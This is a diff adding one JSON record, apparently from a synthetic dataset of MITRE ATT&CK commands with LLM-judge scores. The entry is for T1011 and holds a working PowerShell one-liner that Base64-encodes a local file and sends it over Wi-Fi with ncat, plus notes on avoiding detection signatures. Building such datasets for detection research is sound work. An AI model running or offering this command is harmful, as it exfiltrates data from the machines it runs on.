@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$if=(Get-NetAdapter -Name 'Wi-Fi').ifIndex; $dest=('fe80::a00:27ff:fe4e:66a1%{0}' -f $if); $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 $dest 59555 --send-only",
+  "explanation": "Exfiltrates to a link-local IPv6 address on the Wi-Fi interface, using a local wireless medium distinct from primary routed channels. Data remains Base64-encoded, aligning with T1011's use of other network media.",
+  "rationale_steps": [
+    "Target a link-local IPv6 address on Wi-Fi to ensure a distinct network path.",
+    "Send Base64 data to an uncommon high TCP port to avoid typical service signatures."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-aa6947e1",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell assignments, formatting, quoting, and piping are correct, and ncat options/arguments are valid and well-ordered.",
+        "semantic_score": 5,
+        "semantic_justification": "It reads a file, Base64-encodes it, and sends it via ncat to a link-local IPv6 address explicitly scoped to the Wi‑Fi interface, aligning with T1011’s exfiltration over a different network medium.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-09-30T23:56:49.384370Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced parentheses, proper string formatting using -f operator, valid semicolon separators, and correct ncat.exe flag usage (-6, --send-only).",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly implements T1011 by retrieving the Wi-Fi adapter's interface index, constructing a link-local IPv6 address scoped to that interface, Base64-encoding a file from a realistic path, and piping it over the Wi-Fi medium via ncat to a non-standard port, fully aligning with exfiltration over an alternate network medium.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2026-02-18T21:52:56.170828Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses proper PowerShell syntax, correct variable assignment, string formatting for the IPv6 scope ID, and valid pipe operators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements exfiltration over a specific network medium (Wi-Fi) by resolving the interface index and using it to route traffic over a link-local IPv6 address via ncat.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T21:52:57.704990Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
